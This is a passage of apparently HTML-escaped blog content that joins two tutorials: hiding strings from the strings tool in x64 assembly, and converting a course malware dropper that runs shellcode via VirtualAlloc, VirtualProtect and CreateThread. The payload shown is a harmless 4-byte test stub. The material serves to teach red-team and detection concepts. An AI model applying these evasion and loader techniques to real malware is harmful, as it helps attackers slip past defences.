&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;o&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;

&lt;hr /&gt;
&lt;p&gt;With this final version of the code, "notepad" will not be visible to &lt;code&gt;strings&lt;/code&gt; anymore.&lt;/p&gt;
&lt;p&gt;Here is our final code:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;bits&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rel&lt;/span&gt;

&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;msg_open&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;open&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;

&lt;p&gt;Writing the code above can get a little tedious especially if we want to pass a really long string. Thankfully, we can use a macro like the one I've written below:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;macro&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="no"&gt;addstr2stack&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;-*&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;assign&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;assign&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="na"&gt;rep&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;%0&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;i&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="no"&gt;j&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;assign&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;i&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;rotate&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;assign&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;j&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;j&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;assign&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;endif&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;endrep&lt;/span&gt;
&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="nf"&gt;endmacro&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;What the macro does is that it loops through each character and places it into the correct position on the stack.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Important note:&lt;/strong&gt; When reserving space on the stack, make sure it is in multiples of 16! This is because the stack has a 16-bit boundary for stack alignment! &lt;/p&gt;
&lt;p&gt;For example, if our string has 10 characters, we only need to reserve 16 bytes. If our character is 20 characters long, we'd have to reserve 32 bytes.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This macro can then be called like this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;sub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="c1"&gt;; Reserve space for the string on the stack&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;addstr2stack&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;n&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;o&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;t&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;e&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;p&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;a&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="no"&gt;d&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="c1"&gt;; After use, release the space&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here is what the result of the macro looks like in the debugger:&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-1-05" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-1-05.png" /&gt;&lt;/p&gt;
&lt;p&gt;For the full source code visit the repo &lt;a href="https://github.com/accidentalrebel/string-anti-virus-evasion-x64-assembly"&gt;on Github&lt;/a&gt;. Updates and fixes to the code will be pushed there.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;So there you have it, we were able to successfully hide strings by changing the way how the data is declared and placed in memory. If you think about it, the technique is very simple.&lt;/p&gt;
&lt;p&gt;However, we've only seen it used against the &lt;code&gt;strings&lt;/code&gt; command. Can it evade an actual anti-virus? The answer is probably no. In my next post I'll be talking about API call obfuscation that would help hide functions like &lt;code&gt;ShellExecute&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Edit: &lt;a href="string-av-evasion-in-x64-assembly-part-1"&gt;Part 2 here&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The malware dropper that we'll be converting is made by &lt;a href="https://twitter.com/sektor7net"&gt;@reenz0h&lt;/a&gt;. I found it in &lt;a href="https://github.com/kymb0/Malware_learns"&gt;kymb0's repository&lt;/a&gt; and I learned that it's a part of the &lt;a href="https://institute.sektor7.net/"&gt;Red Team Operator course by Sektor7&lt;/a&gt;. I've read good things about the course and I plan to take it in the future, you should check it out too.&lt;/p&gt;

&lt;p&gt;Here's the malware dropper that we'll be converting:&lt;/p&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;rv&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VirtualProtect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec_mem&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;payload_len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PAGE_EXECUTE_READ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;oldprotect&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Hit me!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;getchar&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;// If all good, run the payload&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rv&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;th&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CreateThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LPTHREAD_START_ROUTINE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;exec_mem&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;WaitForSingleObject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;th&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;-1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Here is what the code does:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Allocates memory buffer with size &lt;code&gt;payload_len&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Copies &lt;code&gt;payload&lt;/code&gt; to the buffer&lt;/li&gt;
&lt;li&gt;The buffer's memory protection is changed to &lt;code&gt;PAGE_EXECUTE_READ&lt;/code&gt; which allows for code execution&lt;/li&gt;
&lt;li&gt;A thread is created that runs the payload, which runs indefinitely&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It doesn't seem that the program is doing much when run. All we see are the payload and exec_mem addresses for debugging purposes and nothing much else.&lt;/p&gt;
&lt;p&gt;&lt;img alt="converting-a-malware-dropper-to-x64-assembly-01" src="https://www.accidentalrebel.com/images/converting-a-malware-dropper-to-x64-assembly-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;The most interesting parts with this code will be seen under a debugger, which I'll go through later in this post.&lt;/p&gt;
&lt;h2 id="including-external-functions"&gt;Including external functions&lt;/h2&gt;
&lt;p&gt;In C, if we want to to use a Windows API function, we need to include the necessary header files and make sure to supply required library names via the linker, like so:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;x64 assembly does not use header files so the process is done differently. First, the necessary ".lib" files should be supplied to the linker:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;link&lt;span class="w"&gt; &lt;/span&gt;dropper_data.obj&lt;span class="w"&gt; &lt;/span&gt;/subsystem:console&lt;span class="w"&gt; &lt;/span&gt;/out:dropper_data.exe&lt;span class="w"&gt; &lt;/span&gt;kernel32.lib&lt;span class="w"&gt; &lt;/span&gt;msvcrt.lib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Next, every external function that we'll be using in our code needs to be specified as shown below:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.text&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;ExitProcess&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;printf&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;VirtualAlloc&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;VirtualProtect&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;RtlMoveMemory&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;getchar&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;CreateThread&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;extern&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;WaitForSingleObject&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Note that the &lt;code&gt;extern&lt;/code&gt; keyword in assembly is different in C. Externs in C are used for &lt;em&gt;exporting&lt;/em&gt; symbols while they are used for &lt;em&gt;importing&lt;/em&gt; symbols in Assembly. &lt;code&gt;global&lt;/code&gt; is the one used for exporting.&lt;/p&gt;
&lt;p&gt;Once the symbols are properly exported then that is when the functions can be used with the &lt;code&gt;call&lt;/code&gt; operand.&lt;/p&gt;
&lt;h2 id="the-entrypoint"&gt;The entrypoint&lt;/h2&gt;
&lt;p&gt;There needs to be an entry point so that the operating system knows where to jump to start our program. We do this in C by declaring a &lt;code&gt;main&lt;/code&gt; function:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In assembly, we declare the entry point with &lt;code&gt;global main&lt;/code&gt; (As seen in the previous section) and also supply the &lt;code&gt;main:&lt;/code&gt; label within the code. This is where execution will jump to.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.text&lt;/span&gt;
&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nf"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;
&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;

&lt;span class="nl"&gt;main:&lt;/span&gt;
&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="no"&gt;rbp&lt;/span&gt;
&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="the-payload"&gt;The payload&lt;/h2&gt;
&lt;p&gt;The payload in this example is a simple shellcode made for testing purposes. This can be changed to any shellcode of any length as long as &lt;code&gt;payload_len&lt;/code&gt; reflects the new size of the shellcode.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;// 4 byte payload&lt;/span&gt;
&lt;span class="kt"&gt;unsigned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="c1"&gt;// NOP&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="c1"&gt;// NOP&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mh"&gt;0xcc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="c1"&gt;// INT3&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mh"&gt;0xc3&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="c1"&gt;// RET&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="kt"&gt;unsigned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;payload_len&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In assembly, initializing data is done in &lt;code&gt;segment .data&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;segment&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;.data&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;;; 4 byte payload&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;payload&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xCC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xC3&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nf"&gt;payload_len&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="no"&gt;db&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then check the above data laid out in the &lt;code&gt;.data&lt;/code&gt; memory segment using a debugger:&lt;/p&gt;
&lt;p&gt;&lt;img alt="converting-a-malware-dropper-to-x64-assembly-02" src="https://www.accidentalrebel.com/images/converting-a-malware-dropper-to-x64-assembly-02.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="converting-a-malware-dropper-to-x64-assembly-03" src="https://www.accidentalrebel.com/images/converting-a-malware-dropper-to-x64-assembly-03.png" /&gt;&lt;/p&gt;
